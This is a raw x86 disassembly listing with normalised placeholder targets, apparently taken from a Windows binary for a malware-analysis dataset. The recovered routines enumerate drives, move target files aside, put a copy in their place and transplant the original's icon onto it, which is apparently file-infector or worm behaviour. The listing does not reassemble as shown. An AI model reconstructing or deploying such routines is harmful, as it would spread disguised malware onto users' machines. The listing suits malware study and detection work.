mov [ edx + 0x8 ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov eax [ eax ]
call sub_408220
mov edx [ ebp - 0x3c ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x3c ]
mov [ edx + 0x4 ] eax
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x4008
mov eax [ ebp - 0x3c ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
sub [ ebp - 0x38 ] 0x10
movzx eax [ esi + ebx + 0x3 ]
mov edx eax
and dl 0x7f
movzx edx dl
mov [ ebp - 0x2c ] edx
and al 0x80
cmp [ ebp - 0x2c ] 0xa
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3533
mov ebx [ ebp - 0x30 ]
test ebx ebx
je r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x250 ]
mov edi [ esi + 0x4 ]
test edi edi
je r-xdata
mov eax 0x3
mov eax [ ebp - 0x38 ]
mov edx [ ebp - 0x2c ]
mov [ eax ] edx
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
cmp [ ebp - 0x2c ] 0x5
jl r-xdata
mov eax [ ebp - 0x34 ]
cmp [ eax ] 0x100
jne r-xdata
mov eax [ ebp - 0x2c ]
or eax 0x4000
mov edx [ ebp - 0x38 ]
mov [ edx ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
cmp [ eax ] 0x100
jne r-xdata
add [ ebp - 0x34 ] 0x4
inc [ ebp - 0x30 ]
jmp r-xdata
retn
dec ebx
mov eax [ ebp + ebx * 8 - 0x250 ]
push eax
call SysFreeString
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
mov edx edi
mov eax [ esi ]
call sub_408204
cmp [ ebp - 0x2c ] 0x7
jg r-xdata
mov eax [ ebp - 0x34 ]
mov edx [ eax ]
mov ecx [ ebp - 0x38 ]
mov [ ecx ] edx
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + 0x8 ] edx
mov eax [ eax + 0xc ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0xc ] eax
add [ ebp - 0x34 ] 0xc
jmp r-xdata
mov eax [ ebp - 0x30 ]
lea eax [ ebp + eax * 8 - 0x250 ]
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x34 ]
mov eax [ eax + 0x8 ]
call sub_408220
mov edx [ ebp - 0x40 ]
mov [ edx ] eax
mov eax [ ebp - 0x40 ]
xor edx edx
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x38 ]
mov [ eax ] 0x8
mov eax [ ebp - 0x40 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0x8 ] eax
inc [ ebp - 0x30 ]
jmp r-xdata
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx eax
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov ecx 0x8
call sub_41c908
add [ ebp - 0x34 ] 0x4
mov eax [ ebp - 0x34 ]
mov eax [ eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + 0xc ] eax
sub_4a3560
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x6
lea eax [ ebp - 0x8 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4162b0
call sub_4060b0
pop ecx
pop ecx
pop ebp
retn
sub_4a3594
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp - 0x18 ]
xor edi edi
mov [ ebp - 0x4 ] esp
mov eax [ ebp - 0x8 ]
inc eax
shl eax 0x2
sub esp eax
lea eax [ ebp - 0xc ]
mov [ eax ] esp
mov eax [ ebp - 0x8 ]
sub eax edi
mov edx [ ebp - 0xc ]
mov ecx [ ebp - 0x14 ]
mov [ edx + eax * 4 ] ecx
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x14 ]
mov [ eax ] edx
jmp r-xdata
mov eax ebx
call sub_412520
mov esi eax
push 0x0
push 0x0
push esi
push ebx
push 0x0
push 0xfde9
call MultiByteToWideChar
inc eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
add eax eax
add eax 0x3
and eax 0xfffffffc
sub esp eax
lea eax [ ebp - 0x14 ]
mov [ eax ] esp
test edi edi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call GetThreadLocale
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
cmp eax 0x80020006
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push esi
push ebx
push 0x0
push 0xfde9
call MultiByteToWideChar
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov [ eax + edx * 2 - 0x2 ] 0x0
inc esi
add ebx esi
inc edi
cmp edi [ ebp - 0x8 ]
jne r-xdata
call sub_4a2e30
push ebp
call sub_4a3560
pop ecx
jmp r-xdata
mov esp [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4a3690
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
mov ebx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ ebx + 0x1 ] 0x40
jbe r-xdata
movzx edx [ eax ]
cmp dx 0x9
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4161e0
call sub_4060b0
cmp dx 0x4009
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
call sub_4a3678
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x104 ]
push eax
movzx ecx [ ebx + 0x2 ]
inc ecx
movzx eax [ ebx + 0x1 ]
lea edx [ ebx + eax + 0x3 ]
mov eax [ ebp - 0x4 ]
call sub_4a3594
test esi esi
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
push esi
lea ecx [ ebp - 0x104 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4a3224
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax esi
call sub_41c288
sub_4a372c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
xor edx edx
push ebp
push sub_4a37f1
push [ fs : edx ]
mov [ fs : edx ] esp
cmp eax 0x80020009
jne r-xdata
push eax
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a2ca8
mov esi eax
mov eax [ ebx + 0x1c ]
push eax
lea eax [ ebp - 0x8 ]
mov edx [ ebx + 0x4 ]
call sub_4072f8
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0xc ]
call sub_4072f8
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebx + 0x8 ]
call sub_4072f8
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4a2d7c
mov esi eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax esi
call sub_4060b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a37f8
lea eax [ ebp - 0x10 ]
mov edx 0x3
call j_sub_4068c4
retn
push [ ebp - 0x4 ]
mov eax esi
jmp sub_4060b0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_407f50
jmp r-xdata
sub_4a381c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
xor edx edx
mov edi esp
movzx ecx [ ebx + 0x1 ]
mov [ ebp - 0x8 ] ecx
test ecx ecx
je r-xdata
mov [ ebp - 0x10 ] esp
movzx eax [ ebx + 0x2 ]
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
add ebx 0x3
mov esi [ ebp + 0x18 ]
movzx ecx [ ebx ]
cmp ecx 0x4
jne r-xdata
mov esi [ ebp + 0x14 ]
and al 0x7f
or eax 0x4000
cmp al 0xc
je r-xdata
mov [ ebp - 0xc ] esp
push edx
lea eax [ ebp - 0x30 ]
push eax
push ecx
push edx
call sub_4a380c
pop edx
pop ecx
push [ ebp + 0x1c ]
lea eax [ ebp - 0x10 ]
push eax
push ecx
push edx
push rw-data
push [ ebp + 0x10 ]
mov eax [ ebp + 0x8 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
push 0xfffffffd
inc [ ebp - 0x4 ]
cmp [ ebx + 0x3 ] 0x9
je r-xdata
push [ esi + eax * 4 - 0x4 ]
dec eax
jne r-xdata
movzx eax [ ebx ]
test al 0x80
jne r-xdata
mov ebx [ ebp + 0xc ]
push [ esi + 0xc ]
push [ esi + 0x8 ]
push [ esi + 0x4 ]
push [ esi ]
add esi 0x10
jmp r-xdata
cmp al 0x5
jb r-xdata
mov esp edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
lea edx [ ebp - 0x30 ]
mov cl 0x1
push ecx
mov ecx [ ebp + 0x4 ]
jmp sub_4a372c
mov ecx 0x8
cmp [ ebx + 0x3 ] 0xd
jne r-xdata
inc ebx
dec ecx
jne r-xdata
push edx
push [ esi ]
push edx
push eax
add esi 0x4
cmp al 0x7
ja r-xdata
push [ esi + 0x4 ]
push [ esi ]
push edx
push eax
add esi 0x8
jmp r-xdata
sub_4a3900
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x10 ]
xor eax eax
push eax
push eax
push eax
push eax
mov eax esp
push eax
lea eax [ ebp + 0x14 ]
push eax
push eax
push [ ebx ]
lea eax [ ebx + 0x5 ]
push eax
push [ ebp + 0xc ]
call sub_4a381c
movzx eax [ ebx + 0x4 ]
mov ebx [ ebp + 0x8 ]
jmp [ eax * 4 + jump_table_4a3931 ]
fld [ esp + 0x8 ]
jmp r-xdata
fld [ esp + 0x8 ]
jmp r-xdata
fild [ esp + 0x8 ]
jmp r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax ebx
call sub_41c288
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x8 ]
add esp 0x10
pop ebx
pop ebp
retn
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
call SysFreeString
mov eax [ esp + 0x8 ]
mov [ ebx ] eax
jmp r-xdata
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4a39dc
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0xffffffff
je r-xdata
call [ rw-data ]
push 0x0
call CoInitialize
test eax 0x80000000
sete al
mov [ rw-data ] al
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
push 0x0
call [ rw-data ]
test eax 0x80000000
sete al
mov [ rw-data ] al
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov al 0x1
test [ rw-data ] 0x2
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ rw-data ]
mov [ edx ] al
retn
sub_4a3a58
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4a3ace
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3ad5
retn
mov [ rw-data ] 0x1
mov eax [ rw-data ]
call sub_4055f0
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
mov ecx 0x5
mov edx [ r-xdata ]
call sub_407e40
call CoUninitialize
sub_4a3ad8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push sub_4a3b0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax r-xdata
call sub_41207c
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a3b58
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4a3bad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax 0x104
call sub_404204
mov ebx eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push 0x0
call SHGetSpecialFolderLocation
push ebx
mov eax [ ebp - 0x4 ]
push eax
call SHGetPathFromIDListW
mov eax edi
mov edx ebx
call sub_407254
mov eax ebx
call sub_404220
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4a3bc0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4a3c4d
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a3c28
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax 0x1a
call sub_4a3b58
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
call sub_407564
push [ ebp - 0x4 ]
push r-xdata
push r-xdata
mov eax ebx
mov edx 0x3
call sub_407648
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3c54
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a3c9c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push sub_4a3d25
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a3d00
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax 0x26
call sub_4a3b58
lea eax [ ebp - 0x8 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_4077d0
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx r-xdata
call sub_407564
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3d2c
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a3d50
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
xor eax eax
push ebp
push j_sub_405d1c#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax 0x26
call sub_4a3b58
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4a3d8c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
xor edx edx
push ebp
push j_sub_405d1c#6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_41207c
test al al
jne r-xdata
mov eax 0x16
mov edx eax
mov eax ebx
call sub_4120e8
mov [ ebp - 0x1 ] 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax ebx
call sub_4120c4
test al al
jne r-xdata
movzx eax [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4a3e04
push ebp
mov ebp esp
add esp 0xfffff750
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a3f37
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
xor eax eax
push ebp
push j_sub_405d1c#5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
lea eax [ ebp - 0x260 ]
call sub_4048e0
mov edx [ ebp - 0x8 ]
lea eax [ ebp - 0x4b0 ]
call sub_4048e0
mov eax [ rw-data ]
mov [ eax ] 0x0
mov edx 0x1
lea eax [ ebp - 0x260 ]
call sub_404db8
call sub_40436c
mov edx 0x1
lea eax [ ebp - 0x4b0 ]
call sub_404dd4
call sub_40436c
jmp r-xdata
lea eax [ ebp - 0x260 ]
call sub_404b5c
call sub_40436c
test al al
je r-xdata
lea eax [ ebp - 0x10 ]
push eax
lea edx [ ebp - 0x8b0 ]
mov ecx 0x400
lea eax [ ebp - 0x260 ]
call sub_404a38
call sub_40436c
push 0x0
lea edx [ ebp - 0x8b0 ]
mov ecx [ ebp - 0x10 ]
lea eax [ ebp - 0x4b0 ]
call sub_404a58
call sub_40436c
lea eax [ ebp - 0x260 ]
call sub_404a78
call sub_40436c
lea eax [ ebp - 0x4b0 ]
call sub_404a78
call sub_40436c
mov [ ebp - 0x9 ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a3f3e
lea eax [ ebp - 0x8 ]
mov edx 0x2
call j_sub_4068c4
retn
sub_4a3f4c
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x5 ] 0x0
xor edx edx
push ebp
push j_sub_405d1c#4
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
push 0x80
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call CreateFileW
mov ebx eax
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x16
lea eax [ ebp - 0x2a ]
push eax
push ebx
call ReadFile
push 0x0
push 0x0
push 0x0
push ebx
call SetFilePointer
mov eax 0x26
call sub_404204
mov esi eax
mov eax 0x22
call sub_404204
mov edi eax
push 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x26
push esi
push ebx
call ReadFile
mov edx edi
mov eax esi
mov ecx 0x14
call sub_4043c8
mov eax [ esi + 0x6 ]
mov [ edi + 0x6 ] eax
mov eax [ esi + 0xa ]
mov [ edi + 0xa ] eax
mov eax [ esi + 0xe ]
mov [ edi + 0xe ] eax
mov [ edi + 0x12 ] 0x1
mov eax [ esi + 0xe ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_404204
mov [ ebp - 0x14 ] eax
push 0x0
push 0x0
mov eax [ esi + 0x12 ]
push eax
push ebx
call SetFilePointer
push 0x0
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push ebx
call ReadFile
push ebx
call CloseHandle
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call BeginUpdateResourceW
mov ebx eax
test ebx ebx
jle r-xdata
movzx eax [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
call sub_404220
mov eax edi
call sub_404220
mov eax esi
call sub_404220
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x1
push 0x3
push ebx
call UpdateResourceW
push 0x0
push ebx
call EndUpdateResourceW
mov [ ebp - 0x5 ] 0x1
sub_4a4098
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
mov eax [ ebp - 0x8 ]
call j_sub_406bfc
mov eax [ ebp - 0xc ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a41a3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4a417e
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_452dd4
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_4a416d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
mov eax [ rw-data ]
push eax
call ExtractIconW
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_453268
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x58 ]
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
mov eax [ ebp - 0xc ]
call sub_407134
pop edx
call sub_4a3f4c
mov eax [ ebp - 0xc ]
call sub_41207c
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a4174
mov eax [ ebp - 0x10 ]
call sub_4055f0
retn
mov eax [ ebp - 0xc ]
call sub_407134
push eax
call DeleteFileW
sub_4a4174
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a41aa
lea eax [ ebp - 0xc ]
mov edx 0x3
call j_sub_4068c4
retn
sub_4a41b4
push ebp
mov ebp esp
mov ecx 0x6
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a43e3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
mov eax [ ebp - 0x4 ]
call sub_41207c
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a43ea
lea eax [ ebp - 0x34 ]
mov edx 0x3
call j_sub_4068c4
lea eax [ ebp - 0x24 ]
mov edx 0x9
call j_sub_4068c4
retn
mov eax [ ebp - 0x4 ]
call sub_4a4418
test al al
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41239c
push [ ebp - 0x18 ]
push r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_4123d8
push [ ebp - 0x1c ]
lea eax [ ebp - 0x8 ]
mov edx 0x3
call sub_407648
mov eax [ ebp - 0x8 ]
test eax eax
je r-xdata
mov ebx eax
test ebx ebx
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x20 ]
push eax
mov ecx ebx
sub ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x8 ]
call sub_4077d0
mov edx [ ebp - 0x20 ]
lea eax [ ebp - 0x10 ]
mov ecx r-xdata
call sub_407564
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4123d8
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4123d8
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x28 ] eax
mov ebx [ ebp - 0x28 ]
test ebx ebx
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_406a50
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_41239c
push [ ebp - 0x2c ]
push r-xdata
lea eax [ ebp - 0x30 ]
push eax
mov ecx ebx
mov edx 0x2
mov eax [ ebp - 0x14 ]
call sub_4077d0
push [ ebp - 0x30 ]
lea eax [ ebp - 0xc ]
mov edx 0x3
call sub_407648
mov eax [ ebp - 0x4 ]
call sub_41207c
test al al
je r-xdata
sub ebx 0x4
mov ebx [ ebx ]
mov eax [ ebp - 0x8 ]
call sub_41207c
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_41207c
test al al
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
xor eax eax
push ebp
push sub_4a4399
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
call sub_407134
push eax
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
call MoveFileW
mov eax [ ebp - 0x8 ]
call sub_4a3d8c
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a10cc
mov eax [ ebp - 0x34 ]
mov edx [ ebp - 0x4 ]
call sub_4a3e04
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4a4098
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4a0558
sub_4a4418
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_4a44bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
xor edx edx
push ebp
push sub_4a449f
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_41207c
test al al
jne r-xdata
push 0x0
push 0x80
push 0x3
push 0x0
push 0x0
push 0xc0000000
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
call CreateFileW
cmp eax 0xffffffff
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
push eax
call CloseHandle
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a44c6
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_4a44d4
push ebp
mov ebp esp
add esp 0xfffffdf0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x210 ] ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x7 ] cl
mov [ ebp - 0x6 ] dl
mov [ ebp - 0x5 ] al
lea esi [ ebp - 0x20a ]
xor eax eax
push ebp
push sub_4a4627
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_433bc4
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push j_sub_405d1c#3
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
push 0xff
call GetLogicalDriveStringsW
mov ebx 0x1
cmp ebx 0xff
jg r-xdata
inc ebx
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
call GetDriveTypeW
mov edi eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ esi + ebx * 2 - 0x2 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
lea eax [ ebp - 0x210 ]
movzx edx [ esi + ebx * 2 - 0x2 ]
call sub_407214
mov edx [ ebp - 0x210 ]
lea eax [ ebp - 0x4 ]
call sub_4074a4
inc ebx
test eax eax
jle r-xdata
sub eax 0x4
mov eax [ eax ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
lea eax [ ebp - 0x4 ]
call sub_406a60
call sub_407400
test eax eax
jne r-xdata
cmp edi 0x5
sete al
and al [ ebp - 0x5 ]
cmp al 0x1
je r-xdata
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_4070fc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
cmp edi 0x3
sete al
and al [ ebp - 0x6 ]
cmp al 0x1
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4a462e
